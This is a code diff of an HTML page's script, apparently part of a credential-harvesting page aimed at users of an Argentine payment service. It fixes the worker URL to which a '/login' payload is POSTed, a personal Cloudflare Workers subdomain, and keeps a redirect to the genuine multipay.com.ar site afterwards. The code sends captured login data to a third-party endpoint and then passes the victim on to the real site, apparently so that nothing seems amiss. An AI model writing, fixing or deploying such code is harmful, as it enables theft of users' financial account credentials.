@@ -493,9 +493,9 @@
 
     <script>
         // ============================================================
-        // CONFIGURACIÓN - CAMBIA ESTA URL POR LA DE TU 
+        // CONFIGURACIÓN - URL DEL WORKER SIN BARRA AL FINAL
         // ============================================================
-        const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev/'; // <--- CAMBIA ESTO
+        const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev'; // ✅ Sin barra al final
         const REDIRECT_URL = 'https://www.multipay.com.ar/';
 
         // ============================================================
@@ -543,11 +543,12 @@
                 transactionId: transactionId
             };
 
-            console.log('📤 Enviando a:', WORKER_URL + '/login');
+            const url = WORKER_URL + '/login';
+            console.log('📤 Enviando a:', url);
             console.log('📦 Payload:', payload);
 
             try {
-                const response = await fetch(WORKER_URL + '/login', {
+                const response = await fetch(url, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
